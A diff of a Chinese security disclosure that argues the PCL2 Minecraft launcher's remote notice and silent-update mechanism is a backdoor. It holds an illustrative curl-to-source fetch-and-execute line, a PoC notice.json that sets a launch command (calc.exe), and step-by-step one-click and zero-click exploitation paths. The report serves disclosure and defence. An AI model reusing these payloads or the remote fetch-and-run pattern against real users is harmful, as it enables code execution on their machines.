@@ -3,15 +3,19 @@
 
 [2026-10-25 更新 2.99.0.1 删掉了吗？没有——见复查报告](analysis/2.99.0.1/README.md)；[Windows VM 动态复现与录屏](analysis/2.99.0.1/vm-test/README.md)
 
-# 重申为什么我的观点倾向于 PCL 有一个后门。
+# 重申为什么是后门？
 
 鉴于所谓其他软件的撑腰“开团”，我想在这里作一些评论。
 
-我一直强调的“何谓后门”？答案是：即在用户**不预知**的情况下作出意料外的事情；且软件在用户未明确授权的情况下，从远程获取并执行可由别人控制的代码。
+我一直强调的“何谓后门[^backdoor]”？一种*未经文档记录的*、获取计算机系统访问权限的途径。
 
-用简单的 bash 来举例（你们最喜欢的 bash2shell 笑话：）一个简化 Minecraft 启动器的核心流程。
+在这里的情况，说人话就是：即在用户**不预知**的情况下作出意料外的事情；且软件在用户未明确授权的情况下，从远程获取并执行可由别人控制的代码。
 
-我们简单定义一个 Shell 函数作为一个 Minecraft 启动器。
+用简单的 bash 来举例（你们最喜欢的 bash2shell 笑话：）。我们写一个 Minecraft 启动器的核心流程。
+
+## 举例
+
+定义一个 Shell 函数作为一个 Minecraft 启动器。
 
 ```bash
 mc() {
@@ -20,31 +24,33 @@ mc() {
 }
 ```
 
-这是我们预想的，对吧？用 Java 启动一个游戏。
+这是我们预想的，对吧？**用 Java 启动一个游戏。**很简单，我想按下一个启动游戏，它应该只启动游戏。
 
-当然，我们也可以在游戏启动之前再加一个命令。并且作为接口开放。注意，这也是有些人最喜欢偷换概念，说“我们的软件也有 RCE 漏洞”，而这是用户可预知的。因为这是用户自己设定的，就算不是，也能看到到底输入了什么。
+当然，我们也可以在游戏启动之前再加一个命令。并且作为接口开放，以便所需。
+
+注意：这也是有些人最喜欢偷换概念。说“我们的软件也有 RCE 漏洞”，而展示一个运行前的命令填写框。但这是用户自己设定的，用户能够预知会发生什么。
 
 ```bash
 mc() {
     local <省略>
-    local PRESTART="fcitx5-remote -c" # 作为接口开放的话，我们也知道做了什么。
-    eval "$PRESTART" && java <省略> "$@"
+    local PRESTART="fcitx5-remote -c" 
+    eval "$PRESTART" # 我们知道做了什么 :)
+        && java <省略> "$@"
 }
 ```
 
-那如果，我在前或后面加上一行呢？
+但是，PCL 并不是这样。它的抽象命令是这样的。
 
 ```bash
 mc() {
     local TOKEN="114514" <省略>
     local PRESTART="fcitx5-remote -c" 
-    source <(curl -fsSL "https://example.com/script?session=${TOKEN}") \ # 开源版本，这里写的是：“由于包含加解密等安全信息，本文件中的部分代码已被删除”
+    source <(curl -fsSL "https://example.com/script?session=${TOKEN}") \
     # ↑ 在这里，我们不得知做了什么。
     # 即便他只是作为公告 Whatever. 但是他也有运行命令的能力。
-    # 而这是不预知的。
-    # 在现实情况下。如果把它藏起来，让大家看不到呢？
-    # 或者是，把代码给大家看。
-    # 只不过不告诉大家我们会这么做。
+    # 而这不能预测到。我们不知道每次从互联网上 fetch 下来什么。
+    # 并且我们不能审查代码，因为开源版本，这里写的是：“由于包含加解密等安全信息，本文件中的部分代码已被删除”
+    # 一些人偷换概念很搞笑
         && eval "$PRESTART" \
         && java <省略> "$@"
 }
@@ -54,22 +60,35 @@ mc() {
 
 我不求做什么 whistleblower，但是我们应该都知道，我们想要安心地运行一个程序。
 
+2026-10-24 初版
+
+2026-10-25 修订
+
 # <a id="my-apology" ></a> Notice 公告
 
 在这里先向龙腾猫跃道歉。
 
-我是一个兴趣使然的人，爱好研究以及 UI/UX。前两天，我在哔哩哔哩看到 SEDET 的视频，一个直接读 LLM 稿的视频，但是大家都在评判立场和 LLM 使用。我看到了他说的东西。而后，我找到了一件样本，这是其中一个路径 RCE 的方式，而后我用 AI 工具独立地找到了另一个。（后检查无参考其他内容）
+我是一个兴趣使然的人，爱好研究以及 UI/UX。前两天，我在哔哩哔哩看到 SEDET 的视频——一个直接读 LLM 稿的。评论里大家都在评判他的立场和滥用 AI。但是，我看到了他想表达的事情。我从小坤鸽找到了一个样本，正如他食品演示的其中一个远程 RCE 性质的缺陷。而后，当我研究这份样本时，我独立地找到了另一个 RCE 性质的缺陷……
 
-另一个因为性质险峻，甚至是一个 0 CLICK 类型的。这非常危险。并且这个功能无任何提示，没有任何方式可以关掉它，并且在本应该能关掉它的地方，造成了误解。我认为界面操作上的问题也是一种漏洞——我先前已经找到过一个 Android 系统的漏洞，发送到了 Android VRP 并被 Google 认可，功能本身无害，但是危害在 UI 上造成的误解——因此，我认为，若用户不知道一个软件他会做什么，甚至是做了一些不可预测的事情，无论出于好坏目的，他都会损坏用户体验，如果做的事情不可评估好坏，它即有可能会被利用。并且最近漏洞频发，相似的事件太多（如 LTT 频道因测评软件误运行间谍软件，导致 Cookie 被盗用。）甚至有供应链攻击的风险（如盗取 SSH 密钥，）我本质希望能减少攻击面和被攻击的风险。
+……这个缺陷性质危险，我认为是一个 0-Click RCE 的后门，这相比于上一个更加危险，你可以从 PCL 的设置里检查它，它也不是 0-Click 的，你需要点击一次。但是这个不是，这近乎于后门了。
 
-我发布 PoC 是希望大家广泛知道这件事情。我使用自由软件和开源软件很久了，我今天才把 QQ 下回来，准备和大家公布这件事情。
+为什么？因为后门[^backdoor]是“一种*未经文档记录的*、获取计算机系统访问权限的途径。”很显然，本文的提及的两个缺陷也许都满足此定义。因为，直到被发现，开发者从来没有提及过这个功能。诚然，后门也许是出于善意设置的，但使用可以朝着恶意去使用的。个人开发者很难去自证“我设计一个功能，到底是*好*还是*坏*呢？”所以最好的办法就是“少做少错，不做不错。”但我这里并不是让开发者什么都不做，而是不做那些令人费解、令人误解的功能。
 
-我在此呼吁你添加几项 feature：
+[^backdoor]: [NIST SP 800-82 Rev. 3 关于后门的定义](https://csrc.nist.gov/glossary/term/backdoor)
 
-1. PIN 住证书。[中国国家互联网应急中心在三天前报道了一起中国境外自治域 AS 402425 恶意篡改部分 DNS 解析数据事件](https://mp.weixin.qq.com/s/CAZ90qRk6klmRu6Z9RbvMg)。其中修改了 DNS 解析值，并使用 Let's Encrypt 申领了证书。受影响的主体存在 Akamai CDN。劫持、修改响应并非不可发生，安全不可忽视。
-2. 移除这类代码，转而使用“更新墙”强制更新的手段，告知用户你接下来有事情要干。静默更新会导致 user experience 上的出入。其中保持住了“程序要做什么事情”用户的知情的能力。
+我曾经发现过[一个 Android 上的漏洞](https://github.com/MiRinChan#:~:text=Found%20a%20Android%20moderate%20vulnerability%20%2D%20IssueTracker%20539158279%20%28July%2027%2C%202026)，它不是代码有误，而是界面上的设计缺陷。在我或者普遍认为，一个功能只要存在不是按照目标去发展的事情，那它就存在一个缺陷或漏洞。因此，即便一个功能设计初衷是无害的，但它在能力上有害，我认为这个功能就是一种错误的存在，它不应该存在，因此，我写出报告希望大家知道它。但我并不希望大家用这份报告或者 PoC 去做坏事，我只是希望各位开发者不要做这种功能。
 
-另在此谴责使用我的 PoC 去做恶意的行为。
+对于我，我不想信任任何开发者。但即便你信任龙腾猫跃，你也应该知道，你只是信任他的人品，即“龙腾猫跃自身没有主动想去利用他写出来的功能去做坏事”这件事情。但你会信任他的开发环境吗？人是不可能随时防备的。如 LTT 频道因测评软件误运行间谍软件，导致 Cookie 被盗用。科技产品们问世必是漏洞频发的。我们不能把信任随便给出去，而代码本身会说话，它会告诉你它会做什么。因此，这就是我在几年前就[从 Windows 更换到了 NixOS，并一直使用到今天](https://github.com/MiRinChan/MaybeANixOSConfig)。因为，隐藏的代码大家不一定能读透，公开的代码可能好不到哪里去[^xz]。但是至少有很多人会盯着看。
+
+[^xz]: 比如 `xz-utils`.
+
+我本质希望大家能重视到减少攻击面的必要性。
+
+我在此呼吁你，龙腾猫跃，添加几项 feature：
+
+1. PIN 住证书。[中国国家互联网应急中心在三天前报道了一起中国境外自治域 AS 402425 恶意篡改部分 DNS 解析数据事件](https://mp.weixin.qq.com/s/CAZ90qRk6klmRu6Z9RbvMg)。其中修改了 DNS 解析值，并使用 Let's Encrypt 申领了证书。受影响的主体存在 Akamai CDN。*在本公告修订时，有报道指出 AS4847 出现可能的中间人 ssh 连接的情况。*劫持、修改响应并非不可发生，安全不可忽视。
+2. 移除这类代码，转而使用“更新墙”强制更新的手段，告知用户**你接下来有事情要干**。静默更新会导致 user experience 上产生出入。这能保证用户知情“程序要做什么事情”。
+
 
 我也希望龙腾猫跃能给出更好的解决办法。正如我第一次与 PCL 见面，我希望 PCL 越来越好。
 
@@ -78,80 +97,71 @@ mc() {
 
 米凛 aka MiRin
 
-2026-10-23
+2026-10-23 初版
+
+2026-10-25 修订
 
 
 # <a id="report" ></a> PCL2 `notice.json` 远程代码执行分析报告
 
-2026-10-21
+2026-10-21 初版
+
+2026-10-25 修订
 
 省流：PCL2 在特定情况下有能力从服务器下载命令并执行。
 
-|[<img width="40%" alt="哔哩哔哩封面" src="https://github.com/user-attachments/assets/2a72b0e9-f2c0-4623-b7de-502801bc6abb" />](https://www.bilibili.com/video/BV1LZnz6bEXb/)|
-|:---|
-|[哔哩哔哩上的视频演示](https://www.bilibili.com/video/BV1LZnz6bEXb/)，谢谢“盖的二次方”帮忙上传。|
-
-研究员利益相关：https://github.com/MiRinFork/PCLPoC/discussions/1
-
-避免不必要的讨论，谢谢。
+| [<img width="40%" alt="哔哩哔哩封面" src="https://github.com/user-attachments/assets/2a72b0e9-f2c0-4623-b7de-502801bc6abb" />](https://www.bilibili.com/video/BV1LZnz6bEXb/) |
+| :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| [哔哩哔哩上的视频演示](https://www.bilibili.com/video/BV1LZnz6bEXb/)，谢谢“盖的二次方”帮忙上传。                                                                             |
 
 ## 目录
 
-- [0. 摘要](#0-摘要)
-- [1. 样本与来源](#1-样本与来源)
-- [2. 启动时的远程控制代码](#2-启动时的远程控制代码)
-- [3. 利用方法一：notice.json → setup → LaunchAdvanceRun](#method1)
-- [4. 利用方法二：notice.cfg + slientupdate → 静默更新 → 任意 exe](#method2)
-- [5. 为什么这构成"后门"](#backdoor)
-- [6. PoC](#poc)
-- [7. 检测与响应](#response)
-- [8. 附录](#footnotes)
+- [摘要](#摘要)
+- [分析](#分析)
+- [如何远程控制](#如何远程控制)
+- [1-Click RCE 缺陷](#method1)
+- [0-Click RCE 缺陷](#method2)
+- [为什么这构成"后门"](#backdoor)
+- [PoC](#poc)
+- [检测与响应](#response)
+- [附录](#footnotes)
 
-## 0. 摘要
+## 摘要
 
-从蓝奏云下载的样本与官方仓库 Hex-Dragon/PCL2 提交 6b9a50df911c9d68b69b24c979efba477fb14b67（2.99.0.0 正式版）中"最新正式版.zip"内的 exe SHA256 一致。
+蓝奏云样本与官方仓库提交 Hex-Dragon/PCL2 `6b9a50df911c9d68b69b24c979efba477fb14b67` 中根目录的压缩包内的 exe 一致。
 
 ```
 6b6e1260cb5a1d6a303855f1c60cab3d0bc1aebba7e40a964180188b271e7386  Plain Craft Launcher 2.exe
 6b6e1260cb5a1d6a303855f1c60cab3d0bc1aebba7e40a964180188b271e7386  official/Plain Craft Launcher 2.exe
 ```
 
-程序每次启动都会连接 HTTP 地址，按版本条件拉三个 JSON/文本：`notice.cfg`、`notice.json`、`ServerConfig.json`。客户端拿到后直接解释执行其中的 `actions`。
+无论是否“关闭”公告，程序启动时都会请求一次公告。并执行其中的命令，或执行静默更新。
 
-在这个基础上能搭出三条利用方法。
+而命令或静默更新中的软件包，无一有签名。我们不能信任公告一定是作者释放的。或我们不清楚作者释放了什么。
 
-方法一：`notice.json` → `actions.setup` → `LaunchAdvanceRun` → 游戏启动时 `cmd.exe /c "<任意命令>"`。需求方提供的样本走的就是这条路径，我把它复现成了 launch 模式。
+因此，这产生了两种缺陷，我们有两种利用方法。
 
-方法二：`notice.cfg` 写非常高的版本号 → 客户端重新下载攻击者的 `ServerConfig.json` → `Update.Release.DownloadUrls` 指向任意 zip → 解压到 `PCL\` → 用户正常关闭 PCL 时执行 `PCL\Plain Craft Launcher 2.exe`，也就是攻击者的 exe。
+一种针对 1-Click RCE 缺陷。`notice.json` 提供 `actions.setup` 中设定 `LaunchAdvanceRun`。并在游戏启动后运行任意命令。
 
-方法三：`setup` 写入 `UiCustomType=2`、`UiCustomNet=<恶意 XAML>`、`HintCustomCommand=true`，下次启动加载远程自定义主页。
-
-审查代码后的判断是设计上就把服务器下发的 JSON 作为执行目标。`setup` 执行任意命令。
+一种针对 0-Click RCE 缺陷。`notice.cfg` 写非常高的版本号。客户端重新下载 `ServerConfig.json`，而此文件的 `Update.Release.DownloadUrls` 能指向任意文件。下载后会当成压缩包解压到`PCL\`。最后，用户正常关闭 PCL 时执行 `PCL\Plain Craft Launcher 2.exe`，没有任何对签名的校验。
 
 btw，开源仓库里的 `ModSecret.vb` 被刻意删减，远程内容无从审计。
 
-## 1. 样本与来源
+## 分析
 
-### 1.1 基本信息
+### 基本信息与比较方法
 
-| 项目 | 值 |
-|---|---|
-| 文件名 | `Plain Craft Launcher 2.exe` |
-| 大小 | 5,980,160 字节 |
-| 类型 | PE32 GUI，Intel 80386，Mono/.NET assembly |
-| 运行时 | .NET Framework 4.x + WPF（`PresentationFramework` / `PresentationCore` / `System.Xaml`） |
-| 版本 | `PCL2/2.99.0.0.50`；`VersionCode = 413`；`BuildType = Release(50)` |
-| SHA-256 | `6b6e1260cb5a1d6a303855f1c60cab3d0bc1aebba7e40a964180188b271e7386` |
-
-### 1.2 与官方发布包的比对
+文件名为`Plain Craft Launcher 2.exe`。大小 5,980,160 字节。
+版本 PCL2/2.99.0.0.50`；`VersionCode = 413`；`BuildType = Release(50)`
+SHA-256 为 `6b6e1260cb5a1d6a303855f1c60cab3d0bc1aebba7e40a964180188b271e7386`。
 
 ```bash
-git clone --depth 1 https://github.com/Hex-Dragon/PCL2.git
+git clone --depth 1 https://github.com/Hex-Dragon/PCL2.git # 在当时停留于 2.99.0.0，现在为 2.99.0.1 你可能无法复现。
 unzip 最新正式版.zip -d official
 sha256sum official/Plain\ Craft\ Launcher\ 2.exe "Plain Craft Launcher 2.exe"
 ```
 
-### 1.3 反编译方法
+### 反编译方法
 
 使用 ilspycmd 9.1，`-p -o decompiled` 便直接生成工程。
 
@@ -164,23 +174,24 @@ sha256sum official/Plain\ Craft\ Launcher\ 2.exe "Plain Craft Launcher 2.exe"
 - `PCL/Settings.cs`：设置项定义与持久化
 - `PCL/ModLaunch.cs`：`LaunchAdvanceRun` 的实际执行代码
 
-### 1.4 并非开源
-
-官方仓库的 `Plain Craft Launcher 2/Modules/ModSecret.vb` 第一行写着：
+### 并非开源
 
 ```vb
+'path: Plain Craft Launcher 2/Modules/ModSecret.vb'
 '由于包含加解密等安全信息，本文件中的部分代码已被删除
 ```
 
-整个文件只剩 203 行，`notice`、`ServerConfig`、`UpdateStart`、`CheckPotatoCode` 这些逻辑一概没有；而发布版二进制里有完整的实现。
+`notice`、`ServerConfig`、`UpdateStart`、`CheckPotatoCode` 实现全无；而发布版二进制有。
 
 也就是说，远程内容这一整块是闭源的。
 
-这和社区声称“开源启动器”的论调不符，也是这次"后门"争议的来源。
+许可文件表示“PCL 被龙腾猫跃保留所有权利”，且代码使用仅为指南，而并非协议。在中国，不构成合同。没有任何一个字表示过去代码如何授权，未来的指南改变是否追溯其过去。
 
-## 2. 启动时的远程控制代码
+这和社区声称“开源启动器”的论调不符。
 
-### 2.1 调用
+## 如何远程控制
+
+### 调用
 
 `FormMain` 初始化完成后启动 `ModSecret.ServerLoader`：
 
@@ -190,16 +201,7 @@ public static ModLoader.LoaderTask<int, int> ServerLoader =
     new ModLoader.LoaderTask<int, int>("PCL 配置更新", ServerSub, null, ThreadPriority.BelowNormal);
 ```
 
-`ServerSub`（`ModSecret.cs:1262`）依次做这几件事：
-
-1. `GET https://pcl2-server-1253424809.file.myqcloud.com/notice.cfg{CDN}`
-2. 第一段解析成公告编号 `num3`，第五段是服务器配置版本 `num4`
-3. 若本地 `Cache\ServerConfig.json` 的 `Version < num4`，下载 `ServerConfig.json{CDN}`
-4. 若 `num3 > HintNotice` 或缓存不存在，下载 `notice.json{CDN}` 并写入 `%TEMP%\PCL\Cache\Notice.json`
-5. `Settings.Set("HintNotice", num3)`
-6. 反序列化 `notice.json`，逐条匹配 `requirements`，弹出公告，执行 `buttons[].actions` 或顶层 `actions`
-
-关键代码：
+`ServerSub`（`ModSecret.cs:1262`）完成 `GET https://pcl2-server-1253424809.file.myqcloud.com/notice.cfg{CDN}`。第一段解析成公告编号 `num3`，第五段是服务器配置版本 `num4`。若本地 `Cache\ServerConfig.json` 的 `Version < num4`，下载 `ServerConfig.json{CDN}`。若 `num3 > HintNotice` 或缓存不存在，下载 `notice.json{CDN}` 并写入 `%TEMP%\PCL\Cache\Notice.json`。设置 `Settings.Set("HintNotice", num3)`。反序列化 `notice.json`，逐条匹配 `requirements`，弹出公告，执行 `buttons[].actions` 或顶层 `actions`。
 
 ```csharp
 // PCL/ModSecret.cs:1324
@@ -219,7 +221,7 @@ FileUtils.Write(ModBase.PathTemp + "Cache\\Notice.json", text4, null);
 Settings.Set("HintNotice", num3);
 ```
 
-### 2.2 actions 的完整能力
+### actions 在远程控制中发挥作用
 
 `ModSecret.cs:1479-1534`：
 
@@ -253,25 +255,25 @@ foreach (JProperty item3 in obj) {
 }
 ```
 
-其中 `setup` 没有任何 key 白名单/黑名单，遍历字典直接写：
+其中 `setup` 没有任何 key 白名单/黑名单。
+
+> 笔者注，在修补报告时。在 PCL 最新版本已经修复。
 
 ```csharp
 foreach (KeyValuePair<string, JToken> item4 in val5)
     Settings.Set(item4.Key, item4.Value.ToString());
 ```
 
-`Settings.Set` 会按设置项定义的类型做 `CTypeDynamic` 转换。
-
-### 2.3 HasUpdatePermission 恒为 true
+### HasUpdatePermission 恒为 true，则总是允许静默更新
 
 ```csharp
 // PCL/ModSecret.cs:402
 private static bool HasUpdatePermission => true;
 ```
 
-### 2.4 阿里纳西？是签名不是签名
+### アリ！？ナシ！？是签名不是签名
 
-`SecretCdnSign`（`ModSecret.cs:428-445`）的算法：
+`SecretCdnSign`（`ModSecret.cs:428-445`）算法
 
 ```text
 path = URL 中 "://" 之后的第一个 "/" 起
@@ -282,15 +284,13 @@ hash = MD5(path + "-" + ts + "-" + rand + "-0-" + key)
 URL  = path + "?sign=" + ts + "-" + rand + "-0-" + hash
 ```
 
-签名只能防止"URL 被随意拼接"。
+此签名仅是腾讯 COS 的签名功能，此功能本应该在远程端使用，而 PCL 置于本地。密钥硬编码在客户端，任何拿到 exe 的人都能生成合法签名。这只能保证路径没有问题，并不是密码学意义上的签名。
 
-密钥硬编码在客户端，任何拿到 exe 的人都能生成合法签名。
+### 公告的真实格式
 
-然而不是密码学意义上的签名。
+> 2026-10-21 时抓取
 
-### 2.5 线上公告的真实形态
-
-`notice.json`（2026-10-21 时获取）：
+`notice.json`
 
 ```json
 [
@@ -313,7 +313,7 @@ URL  = path + "?sign=" + ts + "-" + rand + "-0-" + hash
 
 `ServerConfig.json` 中 `Update.Release.DownloadUrls` 指向下载链接。
 
-### 2.6 信任边界
+### 流程
 
 ```mermaid
 flowchart TD
@@ -336,38 +336,34 @@ flowchart TD
     E --> N["剪贴板 / 浏览器 / 退出"]
 ```
 
-信任边界画在了"TLS 连接"上，而不是"内容"上。TLS 终端（CDN 或中间人）返回什么 JSON，客户端就当成什么厂商指令来执行。`{CDN}` 的 MD5 签名只保证 URL 不被随意拼，管不了内容替换，何况密钥就躺在客户端里。
+## <a id="method1" ></a> 1-Click RCE 缺陷——使用 LaunchAdvanceRun
 
-## 3. 利用方法一：`notice.json → setup → LaunchAdvanceRun`（点击"启动游戏"）<a id="method1" ></a>
+> 截至报告修补，此缺陷已经修复。
 
-### 3.1 样本
-
-测试样本：
+### 构造恶意样本
 
 ```json
 [
   {
-    "id": 114514,
+    "id": 999,
     "title": "",
     "description": "",
     "requirements": {},
     "actions": {
       "setup": {
-        "LaunchAdvanceRun": "cmd.exe /c calc.exe",
-        "LaunchAdvanceRunWait": "False"
+        "LaunchAdvanceRun": "calc.exe", // 游戏启动前执行的全局命令
+        "LaunchAdvanceRunWait": "False" // 控制是否等待命令结束
       }
     }
   }
 ]
 ```
 
-这份 JSON 会被 `setup` 逐键写进设置：`LaunchAdvanceRun` 是游戏启动前执行的全局命令（字符串），`LaunchAdvanceRunWait` 控制是否等待命令结束。
+这份 JSON 会被 `setup` 写入设置。
 
-实战里有个坑：`importantLevel` 缺省为 2，而 PCL 会拿它和 `SystemSystemActivity`（用户之前点"不再提示"的等级）比较，如果目标机器上的值比 2 大，这条公告会被直接跳过。PoC 用 `importantLevel: 999` 绕开这一点。
+有个坑爹的地方。`importantLevel` 默认为 2，而 PCL 会拿它和 `SystemSystemActivity`，即用户之前点"不再提示"的等级进行比较。如果配置比 2 大，这条公告会被直接跳过。我们用 `importantLevel: 999` 绕开这一点。
 
-### 3.2 LaunchAdvanceRun 到底何时执行
-
-反编译代码里这个设置只有一个消费点：
+### LaunchAdvanceRun 运行时机
 
 ```csharp
 // PCL/ModLaunch.cs:2865
@@ -378,7 +374,7 @@ private static void McLaunchCustom(ModLoader.LoaderTask<int, int> Loader)
     if (Operators.CompareString(text, "", false) != 0)
     {
         McLaunchLog("正在执行全局自定义命令：" + text, (LogLevel)1);
-        Process process = ModBase.StartProcess(new ProcessStartInfo
+        Process process = ModBase.StartProcess(new ProcessStartInfo // 这里开始
         {
             FileName = "cmd.exe",
             Arguments = $"/c \"{text}\"",
@@ -392,34 +388,17 @@ private static void McLaunchCustom(ModLoader.LoaderTask<int, int> Loader)
 }
 ```
 
-`McLaunchCustom` 是 `McLaunchStart` 加载器的一环（`ModLaunch.cs:482`），只在用户点击"启动游戏"之后执行。
+这样的参数还有 `LaunchAdvanceJvm`，追加 JVM 参数，能够加载任意 DLL/JAR。
 
-所以这个形态是一次点击的 RCE：用户点"启动游戏" → `cmd.exe /c "<命令>"`，命令以当前用户权限、无确认框执行。`LaunchAdvanceRunWait=False` 进入后台。
-
-另有一前提，目标机器上得有可用的 Minecraft 版本，否则会在更早的"获取 Java / 登录 / 补全文件"阶段失败，不然触摸不到 `McLaunchCustom`。
-
-### 3.3 同一原语还能写哪些危险设置
-
-`setup` 能写任意已存在的设置键（不存在的键会抛 `KeyNotFoundException`，被逐 action 的 try/catch 捕获）。和代码执行、持久化有关的重点设置 key：
-
-| 设置 key | 作用 | 风险 |
-|---|---|---|
-| `LaunchAdvanceRun` | 游戏启动前 `cmd /c` | 任意命令（利用方法一） |
-| `LaunchAdvanceRunWait` | 是否等待命令 | 控制阻塞/隐藏 |
-| `HintCustomCommand` | 跳过自定义事件确认框 | 关闭最后一道确认 |
-| `LaunchAdvanceJvm` | 追加 JVM 参数 | `-agentpath` / `-javaagent` 加载任意 DLL/JAR |
-| `LaunchAdvanceGame` | 追加游戏参数 | 影响 MC 进程 |
-| `ToolDownloadSource` | 下载源 | 改变后续下载来源 |
-| `SystemSystemTelemetry` | 匿名遥测开关 | 隐私 |
-| `Identify` | 设备识别码 | 指纹/定向 |
-
-## 4. 利用方法二：`notice.cfg + slientupdate → 静默更新 → 任意 exe` <a id="method2" ></a>
+## <a id="method2" ></a> 0-Click RCE 缺陷——使用 slientupdate
 
 这个比上一个更强，他是一个 0 click
 
-### 4.1 提高版本，强制刷新 ServerConfig
+### 提高版本来强行刷新 ServerConfig
 
-`notice.cfg` 的格式是 `id|?|?|?|configVersion`，`ServerSub` 拿第五段和本地 `Cache\ServerConfig.json` 的 `Version` 比较：
+`notice.cfg` 的格式是 `id|?|?|?|configVersion`。
+
+`ServerSub` 拿 `configVersion` 和本地的 `Cache\ServerConfig.json` 的 `Version` 比较。
 
 ```csharp
 double num4 = ModBase.Val(StringExtensions.Split(text3, "|", false)[4]);
@@ -430,9 +409,9 @@ if ((double)num < num4) {
 }
 ```
 
-攻击者可以把 `configVersion` 设成 999，所有客户端就会重新下载攻击者的 `ServerConfig.json`。
+这里可以把 `configVersion` 设成 999，所有客户端就会重新下载的 `ServerConfig.json`。
 
-### 4.2 slientupdate 选择攻击者的下载 URL
+### 修改 slientupdate 选择其他的下载 URL
 
 `notice.json`：
 
@@ -447,10 +426,8 @@ if ((double)num < num4) {
 ]
 ```
 
-`UpdateStart(Silent: true)` 的"获取更新信息"任务：
-
 ```csharp
-// PCL/ModSecret.cs:1004-1026
+// PCL/ModSecret.cs:1004-1026, `UpdateStart(Silent: true)` 的获取更新信息任务
 JObject val = (JObject)ServerConfig["Update"][ModBase.BuildTypes.Release.ToString()];
 if (val.ContainsKey("PatchUrls") && StartsWithF(UpdateMark, "Empty", false))
     Urls = val["PatchUrls"].ToObject<List<string>>();
@@ -463,9 +440,11 @@ LocalPath = string.Format("{0}{1}.{2}{3}",
     ModMain.RequestTaskTempFolder(), "2.99.0.0", 50, Extension);
 ```
 
-`UpdateMark` 的默认值以 `"Empty"` 开头，所以只要攻击者的 `ServerConfig` 不提供 `PatchUrls`，就会落到 `DownloadUrls`。下载 URL 可以是任意 `http(s)://`，扩展名直接取自 URL，这里用 `.zip`。
+`UpdateMark` 的默认值以 `"Empty"` 开头。
 
-### 4.3 解压到 PCL\，退出时执行
+所以只要 `ServerConfig` 不提供 `PatchUrls`，就会从 `DownloadUrls` 下载。
+
+### 解压，并在退出时执行
 
 ```csharp
 // PCL/ModSecret.cs:190-211
@@ -506,9 +485,11 @@ public static void UpdateRestart(bool TriggerRestartAndByEnd)
 }
 ```
 
-`EndProgram` 在退出前检查 `IsUpdateWaitingRestart` 并调用 `UpdateRestart(TriggerRestartAndByEnd: false)`（`FormMain.cs:1963`）。
+`EndProgram` 在退出前检查 `IsUpdateWaitingRestart`。
 
-### 4.4 完整时间线（零点击）
+并调用 `UpdateRestart(TriggerRestartAndByEnd: false)`（`FormMain.cs:1963`）。
+
+### <a id="another-flow" ></a> 流程
 
 ```mermaid
 flowchart TD
@@ -528,23 +509,15 @@ flowchart TD
     M --> N["攻击者 EXE 运行计算器"]
 ```
 
-### 4.5 这里是自动更新！别的启动器都有
+### 疑问：这里是自动更新！别的启动器都有
 
-相比较同行，一个正常的自动更新至少应该有签名或 checksum。并且更新来源是固定的。以及可以被检查的任何行为。
+相比较同行，一个正常的自动更新至少应该有程序签名或 checksum。并且更新来源是固定的。以及可以被检查的任何行为。
 
-而不是偷偷给你运行一个包，美名其曰静默更新，其他整合包、启动器都有。上面规划是好的，就是执行坏了？
+而不是偷偷给你运行一个包，美名其曰“静默更新，其他整合包、启动器都有。”上面规划是好的，就是执行坏了？
 
-## 5. 为什么这是"后门"，不是自动更新？<a id="backdoor" ></a>
+## 为什么这是"后门"，不是自动更新？<a id="backdoor" ></a>
 
-| 能力 | 实现 | 后门特征 |
-|---|---|---|
-| 启动即连固定 C2 | `notice.cfg` / `notice.json` / `ServerConfig.json` | 每次启动自动回连 |
-| 远程任意设置 | `setup` + `Settings.Set` | 可改启动参数、主页、更新源、安全开关 |
-| 远程静默更新 | `slientupdate` + `UpdateStart(true)` | 可替换自身为任意 exe |
-| 远程退出/剪贴板/开网页 | `stop` / `copy` / `website` | 可做定向操作 |
-| 无 Authenticode | PE Security Directory = 0 | 替换/篡改难被发现 |
-| 闭源关键模块 | 官方源码删除 `ModSecret` 公告逻辑 | 不可审计 |
-| 设备指纹 | `Identify`（主板 `LastConfig` + 持久随机数） | 可定向投递 |
+为什么？因为后门[^backdoor]是“一种*未经文档记录的*、获取计算机系统访问权限的途径。”很显然，本文的提及的两个缺陷也许都满足此定义。因为，直到被发现，开发者从来没有提及过这个功能。诚然，后门也许是出于善意设置的，但使用可以朝着恶意去使用的。个人开发者很难去自证“我设计一个功能，到底是*好*还是*坏*呢？”所以最好的办法就是“少做少错，不做不错。”但我这里并不是让开发者什么都不做，而是不做那些令人费解、令人误解的功能。
 
 我们在这里研究的是“能不能”，不是作者“会不会？”
 
@@ -562,48 +535,31 @@ Android 某 Root 程序 S……e 在服务器塞反注入代码，有两种行�
 
 那 PCL 作者，你信吗？
 
-### 5.1 侏罗纪老头进蓝奏云放的
+### 侏罗纪老头进蓝奏云放的
 
-截至笔者完成本报告，没有发现第三方二次打包或额外植入的恶意代码。依据如下：
+截至笔者完成本报告，没有发现第三方二次打包或额外植入的恶意代码。
 
-- 样本 SHA-256 与官方仓库发布包 SHA256 一致；
-- PE 只有 3 个节，是正常 .NET assembly，没有加壳或附加节；
-- 出站域名主要是官方 CDN、GitHub/CNB、BMCLAPI、Modrinth/CurseForge、微软登录、腾讯云 CLS 遥测，以及 `PageLaunchRight` 里列出的社区主页预设（如 `qawsedrftgyhujiko.fun`、`g-fish.dpdns.org` 等，均为用户可选的"主页预设"，不是隐藏 C2）；
-- 没有发现隐藏的 `cmd.exe`/PowerShell 拼接、反射加载任意 URL、计划任务/服务安装这类典型木马行为（`cmd.exe` 只出现在游戏启动、更新安装等常规路径）。
+## <a id="poc" ></a> PoC
 
-真正的问题在官方本身。
-
-### 5.2 攻击链映射（MITRE ATT&CK）
-
-| 阶段 | 技术 | 本报告对应 |
-|---|---|---|
-| 初始访问/供应链 | T1195 Supply Chain Compromise | 控制 CDN / 构建 / 更新源 |
-| 资源开发 | T1587 Develop Capabilities | 伪造 `notice.json` / `ServerConfig` |
-| 执行 | T1059.003 Windows Command Shell | `LaunchAdvanceRun` → `cmd /c` |
-| 执行 | T1204.002 User Execution: Malicious File | 主页按钮/"启动游戏"点击 |
-| 持久化 | T1546 Event Triggered Execution | 公告每次启动执行 |
-| 防御规避 | T1553 Subvert Trust Controls | 无 Authenticode/内容签名；关闭确认框 |
-| 命令与控制 | T1105 Ingress Tool Transfer | `certutil` / 任意 `.zip` 下载 |
-| 影响 | T1554 Compromise Host Software Binary | 静默替换 `PCL\Plain Craft Launcher 2.exe` |
-
-## 6. PoC<a id="poc" ></a>
-
-### 6.1 设计
+### 设计
 
 我们模拟官方服务器。
 
